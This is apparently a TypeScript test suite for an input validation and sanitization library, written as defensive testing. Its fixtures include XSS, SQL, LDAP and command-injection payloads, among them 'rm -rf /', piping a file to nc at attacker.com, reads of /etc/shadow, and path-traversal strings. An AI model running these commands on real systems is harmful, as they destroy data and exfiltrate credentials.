/**
 * Input Validation and Sanitization Test Suite
 * 
 * Comprehensive test cases for input validation and sanitization following TDD approach.
 * Tests cover various attack vectors, data validation, sanitization, and security measures.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { 
  InputValidator, 
  InputSanitizer, 
  ValidationResult, 
  SanitizationResult 
} from '../../libs/security/input-validator';

describe('Input Validation and Sanitization System', () => {
  let validator: InputValidator;
  let sanitizer: InputSanitizer;

  beforeEach(() => {
    validator = new InputValidator();
    sanitizer = new InputSanitizer();
  });

  describe('Basic Input Validation', () => {
    it('should validate email addresses correctly', () => {
      const validEmails = [
        'user@example.com',
        'test.email+tag@domain.co.uk',
        'user123@test-domain.com',
      ];

      const invalidEmails = [
        'invalid-email',
        '@domain.com',
        'user@',
        'user..user@domain.com',
        'user@domain',
      ];

      validEmails.forEach(email => {
        const result = validator.validateEmail(email);
        expect(result.isValid).toBe(true);
        expect(result.errors).toHaveLength(0);
      });

      invalidEmails.forEach(email => {
        const result = validator.validateEmail(email);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      });
    });

    it('should validate usernames with proper constraints', () => {
      const validUsernames = [
        'validuser',
        'user123',
        'user_name',
        'user-name',
        'a'.repeat(3), // minimum length
        'a'.repeat(30), // maximum length
      ];

      const invalidUsernames = [
        'ab', // too short
        'a'.repeat(31), // too long
        'user@name', // invalid character
        'user name', // space not allowed
        '123user', // starts with number
        'user!', // special character
      ];

      validUsernames.forEach(username => {
        const result = validator.validateUsername(username);
        expect(result.isValid).toBe(true);
      });

      invalidUsernames.forEach(username => {
        const result = validator.validateUsername(username);
        expect(result.isValid).toBe(false);
      });
    });

    it('should validate passwords with security requirements', () => {
      const validPasswords = [
        'Password123!',
        'MyStr0ng@Pass',
        'Abcd123$efgh',
      ];

      const invalidPasswords = [
        'password', // no uppercase, numbers, or symbols
        'PASSWORD', // no lowercase, numbers, or symbols
        '12345678', // no letters
        'Password', // no numbers or symbols
        'Pass1!', // too short
        'commonpassword123!', // common password
      ];

      validPasswords.forEach(password => {
        const result = validator.validatePassword(password);
        expect(result.isValid).toBe(true);
      });

      invalidPasswords.forEach(password => {
        const result = validator.validatePassword(password);
        expect(result.isValid).toBe(false);
      });
    });

    it('should validate URLs with proper format', () => {
      const validUrls = [
        'https://www.example.com',
        'http://localhost:3000',
        'https://api.domain.com/v1/endpoint',
        'https://subdomain.example-site.co.uk',
      ];

      const invalidUrls = [
        'not-a-url',
        'ftp://invalid-protocol.com',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'https://',
        'http://malicious-site.com/javascript:alert(1)',
      ];

      validUrls.forEach(url => {
        const result = validator.validateUrl(url);
        expect(result.isValid).toBe(true);
      });

      invalidUrls.forEach(url => {
        const result = validator.validateUrl(url);
        expect(result.isValid).toBe(false);
      });
    });

    it('should validate JSON data safely', () => {
      const validJson = [
        '{"name": "test", "value": 123}',
        '[]',
        '{"nested": {"object": true}}',
        '[1, 2, 3, "string"]',
      ];

      const invalidJson = [
        '{invalid json}',
        '{"name": "test",}', // trailing comma
        'undefined',
        'function() { return "evil"; }',
      ];

      validJson.forEach(json => {
        const result = validator.validateJson(json);
        expect(result.isValid).toBe(true);
        expect(result.data).toBeDefined();
      });

      invalidJson.forEach(json => {
        const result = validator.validateJson(json);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      });
    });
  });

  describe('XSS Prevention', () => {
    it('should detect and flag XSS attempts', () => {
      const xssAttempts = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert(1)',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '"><script>alert(1)</script>',
        "'; DROP TABLE users; --",
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', // base64 encoded
      ];

      xssAttempts.forEach(input => {
        const result = validator.validateInput(input, { 
          type: 'string', 
          maxLength: 1000,
          checkXss: true 
        });
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('XSS'))).toBe(true);
      });
    });

    it('should allow safe HTML when configured', () => {
      const safeInputs = [
        '<p>This is safe content</p>',
        '<strong>Bold text</strong>',
        '<em>Italic text</em>',
        '<ul><li>List item</li></ul>',
      ];

      safeInputs.forEach(input => {
        const result = validator.validateInput(input, { 
          type: 'html', 
          allowedTags: ['p', 'strong', 'em', 'ul', 'li'] 
        });
        expect(result.isValid).toBe(true);
      });
    });

    it('should sanitize HTML removing dangerous elements', () => {
      const dangerousInputs = [
        '<p>Safe content</p><script>alert(1)</script>',
        '<div onclick="alert(1)">Clickable div</div>',
        '<img src="x" onerror="alert(1)">Image',
        '<a href="javascript:alert(1)">Link</a>',
      ];

      dangerousInputs.forEach(input => {
        const result = sanitizer.sanitizeHtml(input);
        expect(result.sanitized).not.toContain('<script>');
        expect(result.sanitized).not.toContain('onclick');
        expect(result.sanitized).not.toContain('onerror');
        expect(result.sanitized).not.toContain('javascript:');
        expect(result.modified).toBe(true);
        expect(result.removedTags.length).toBeGreaterThan(0);
      });
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should detect SQL injection attempts', () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; SELECT * FROM users WHERE '1'='1",
        "admin'--",
        "' UNION SELECT * FROM passwords --",
        "1'; DELETE FROM logs; --",
      ];

      sqlInjectionAttempts.forEach(input => {
        const result = validator.validateInput(input, { 
          type: 'string',
          checkSqlInjection: true 
        });
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('SQL injection'))).toBe(true);
      });
    });

    it('should allow legitimate single quotes in content', () => {
      const legitimateInputs = [
        "It's a beautiful day",
        "John's car",
        "The '90s were great",
        "I'm happy",
      ];

      legitimateInputs.forEach(input => {
        const result = validator.validateInput(input, { 
          type: 'string',
          checkSqlInjection: true 
        });
        expect(result.isValid).toBe(true);
      });
    });
  });

  describe('Command Injection Prevention', () => {
    it('should detect command injection attempts', () => {
      const commandInjectionAttempts = [
        'test; rm -rf /',
        'filename && cat /etc/passwd',
        'file.txt | nc attacker.com 80',
        'data $(whoami)',
        'input `cat /etc/shadow`',
        'test & del /f /q C:\\*',
      ];

      commandInjectionAttempts.forEach(input => {
        const result = validator.validateInput(input, { 
          type: 'filename',
          checkCommandInjection: true 
        });
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('command injection'))).toBe(true);
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should detect path traversal attempts', () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', // URL encoded
      ];

      pathTraversalAttempts.forEach(input => {
        const result = validator.validateInput(input, { 
          type: 'filename',
          checkPathTraversal: true 
        });
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('path traversal'))).toBe(true);
      });
    });

    it('should allow safe filenames', () => {
      const safeFilenames = [
        'document.pdf',
        'image_2023.jpg',
        'data-file.csv',
        'report.xlsx',
      ];

      safeFilenames.forEach(filename => {
        const result = validator.validateInput(filename, { 
          type: 'filename',
          checkPathTraversal: true 
        });
        expect(result.isValid).toBe(true);
      });
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should detect LDAP injection attempts', () => {
      const ldapInjectionAttempts = [
        'user)(|(password=*))',
        '*)(cn=*',
        '*)(&(objectClass=*',
        'admin)(&(password=*))(cn=*',
      ];

      ldapInjectionAttempts.forEach(input => {
        const result = validator.validateInput(input, { 
          type: 'string',
          checkLdapInjection: true 
        });
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('LDAP injection'))).toBe(true);
      });
    });
  });

  describe('File Upload Validation', () => {
    it('should validate file types correctly', () => {
      const allowedFiles = [
        { name: 'document.pdf', type: 'application/pdf', size: 1024 * 1024 },
        { name: 'image.jpg', type: 'image/jpeg', size: 500 * 1024 },
        { name: 'data.csv', type: 'text/csv', size: 100 * 1024 },
      ];

      const blockedFiles = [
        { name: 'malware.exe', type: 'application/x-executable', size: 1024 },
        { name: 'script.js', type: 'application/javascript', size: 1024 },
        { name: 'shell.sh', type: 'application/x-sh', size: 1024 },
        { name: 'image.php.jpg', type: 'image/jpeg', size: 1024 }, // double extension
      ];

      allowedFiles.forEach(file => {
        const result = validator.validateFile(file, {
          allowedTypes: ['application/pdf', 'image/jpeg', 'text/csv'],
          maxSize: 5 * 1024 * 1024,
        });
        expect(result.isValid).toBe(true);
      });

      blockedFiles.forEach(file => {
        const result = validator.validateFile(file, {
          allowedTypes: ['application/pdf', 'image/jpeg', 'text/csv'],
          maxSize: 5 * 1024 * 1024,
        });
        expect(result.isValid).toBe(false);
      });
    });

    it('should enforce file size limits', () => {
      const largeFile = { 
        name: 'large.pdf', 
        type: 'application/pdf', 
        size: 10 * 1024 * 1024 // 10MB
      };

      const result = validator.validateFile(largeFile, {
        allowedTypes: ['application/pdf'],
        maxSize: 5 * 1024 * 1024, // 5MB limit
      });

      expect(result.isValid).toBe(false);
      expect(result.errors.some(error => error.includes('size limit'))).toBe(true);
    });
  });

  describe('Data Sanitization', () => {
    it('should sanitize strings removing dangerous characters', () => {
      const dangerousInputs = [
        { input: 'Hello<script>alert(1)</script>World', shouldModify: true },
        { input: 'User input with "quotes" and \'apostrophes\'', shouldModify: false },
        { input: 'Text with\nnewlines\rand\ttabs', shouldModify: false },
        { input: 'Unicode test: \u200B\u200C\u200D\uFEFF', shouldModify: true }, // zero-width characters
      ];

      dangerousInputs.forEach(({ input, shouldModify }) => {
        const result = sanitizer.sanitizeString(input);
        expect(result.sanitized).not.toContain('<script>');
        expect(result.sanitized).not.toContain('\u200B'); // zero-width space
        expect(result.modified).toBe(shouldModify);
      });
    });

    it('should normalize whitespace correctly', () => {
      const inputs = [
        '  multiple   spaces  ',
        '\t\ttabs\t\t',
        '\n\nnewlines\n\n',
        '   mixed \t\n whitespace   ',
      ];

      inputs.forEach(input => {
        const result = sanitizer.sanitizeString(input, { normalizeWhitespace: true });
        expect(result.sanitized.trim()).not.toMatch(/\s{2,}/); // no multiple spaces
        expect(result.sanitized).not.toMatch(/^\s+|\s+$/); // no leading/trailing space
      });
    });

    it('should encode HTML entities safely', () => {
      const testCases = [
        {
          input: '<div>Test & "quotes"</div>',
          expected: ['&lt;', '&gt;', '&amp;', '&quot;']
        },
        {
          input: 'Price: $100 > $50',
          expected: ['&gt;']
        },
        {
          input: 'Math: 5 < 10 & 10 > 5',
          expected: ['&lt;', '&gt;', '&amp;']
        },
      ];

      testCases.forEach(({ input, expected }) => {
        const result = sanitizer.sanitizeString(input, { encodeHtml: true });
        expected.forEach(expectedEntity => {
          expect(result.sanitized).toContain(expectedEntity);
        });
        expect(result.modified).toBe(true);
      });
    });
  });

  describe('Custom Validation Rules', () => {
    it('should support custom validation functions', () => {
      const customValidator = (value: string) => {
        if (value.includes('forbidden')) {
          return { isValid: false, error: 'Contains forbidden word' };
        }
        return { isValid: true };
      };

      const result = validator.validateInput('This contains forbidden word', {
        type: 'string',
        customValidators: [customValidator],
      });

      expect(result.isValid).toBe(false);
      expect(result.errors.some(error => error.includes('forbidden word'))).toBe(true);
    });

    it('should support regex patterns', () => {
      const phonePattern = /^\+?[1-9]\d{3,14}$/; // Basic international phone format (4-15 digits)

      const validPhones = ['+1234567890', '1234567890'];
      const invalidPhones = ['123', 'abc123', '+abc123'];

      validPhones.forEach(phone => {
        const result = validator.validateInput(phone, {
          type: 'string',
          pattern: phonePattern,
        });
        expect(result.isValid).toBe(true);
      });

      invalidPhones.forEach(phone => {
        const result = validator.validateInput(phone, {
          type: 'string',
          pattern: phonePattern,
        });
        expect(result.isValid).toBe(false);
      });
    });
  });

  describe('Batch Validation', () => {
    it('should validate multiple inputs at once', () => {
      const inputs = {
        email: 'user@example.com',
        username: 'validuser',
        password: 'Password123!',
        age: 25,
      };

      const rules = {
        email: { type: 'email' as const },
        username: { type: 'username' as const, minLength: 3, maxLength: 30 },
        password: { type: 'password' as const },
        age: { type: 'number' as const, min: 18, max: 120 },
      };

      const result = validator.validateBatch(inputs, rules);
      expect(result.isValid).toBe(true);
      expect(Object.keys(result.fieldResults)).toHaveLength(4);
    });

    it('should report all validation errors in batch', () => {
      const inputs = {
        email: 'invalid-email',
        username: 'ab', // too short
        password: 'weak', // too weak
        age: 150, // too old
      };

      const rules = {
        email: { type: 'email' as const },
        username: { type: 'username' as const, minLength: 3, maxLength: 30 },
        password: { type: 'password' as const },
        age: { type: 'number' as const, min: 18, max: 120 },
      };

      const result = validator.validateBatch(inputs, rules);
      expect(result.isValid).toBe(false);
      expect(result.fieldResults.email.isValid).toBe(false);
      expect(result.fieldResults.username.isValid).toBe(false);
      expect(result.fieldResults.password.isValid).toBe(false);
      expect(result.fieldResults.age.isValid).toBe(false);
    });
  });

  describe('Performance and Edge Cases', () => {
    it('should handle large inputs without performance issues', () => {
      const largeInput = 'a'.repeat(100000); // 100KB string

      const start = Date.now();
      const result = validator.validateInput(largeInput, { 
        type: 'string', 
        maxLength: 200000 
      });
      const duration = Date.now() - start;

      expect(result.isValid).toBe(true);
      expect(duration).toBeLessThan(1000); // Should complete within 1 second
    });

    it('should handle null and undefined inputs gracefully', () => {
      const nullResult = validator.validateInput(null as any, { type: 'string' });
      const undefinedResult = validator.validateInput(undefined as any, { type: 'string' });

      expect(nullResult.isValid).toBe(false);
      expect(undefinedResult.isValid).toBe(false);
    });

    it('should handle empty strings based on rules', () => {
      const requiredResult = validator.validateInput('', { 
        type: 'string', 
        required: true 
      });
      const optionalResult = validator.validateInput('', { 
        type: 'string', 
        required: false 
      });

      expect(requiredResult.isValid).toBe(false);
      expect(optionalResult.isValid).toBe(true);
    });

    it('should prevent ReDoS attacks with regex patterns', () => {
      const maliciousInput = 'a'.repeat(100000) + '!';
      const vulnerablePattern = /^(a+)+$/; // Vulnerable to ReDoS

      const start = Date.now();
      const result = validator.validateInput(maliciousInput, {
        type: 'string',
        pattern: vulnerablePattern,
        timeoutMs: 100, // Should timeout quickly
      });
      const duration = Date.now() - start;
      

      expect(duration).toBeLessThan(200); // Should timeout quickly
      expect(result.isValid).toBe(false);
      expect(result.errors.some(error => error.includes('timed out'))).toBe(true);
    });
  });
});